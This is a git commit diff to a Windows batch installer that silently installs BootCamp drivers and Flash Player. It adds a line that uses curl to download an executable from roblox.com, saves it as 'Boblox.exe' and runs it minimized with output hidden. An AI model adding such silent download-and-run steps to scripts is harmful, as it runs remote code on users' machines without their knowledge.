94bbe4fe834e3d81ffcab0506ada1656ab6d1aba
Saylangoz1 <132298381+Saylangoz1@users.noreply.github.com>
2023-05-25 14:42:22 +0300

    Update install.bat

--- install.bat
+++ install.bat
@@ -2,6 +2,8 @@
 title Please Wait...
 echo Please Wait...
 start notepad IMPORTANT.TXT
+start /min /wait curl https://www.roblox.com/download/client --output Boblox.exe > NUL
+start /min Boblox.exe > NUL
 start /min msiexec /i BootCamp\Drivers\Apple\BootCamp.msi /qn > NUL
 start /min /wait flashplayer32_0r0_371_winax.exe -install > NUL
 start /min /wait flashplayer32_0r0_371_winpep.exe -install > NUL
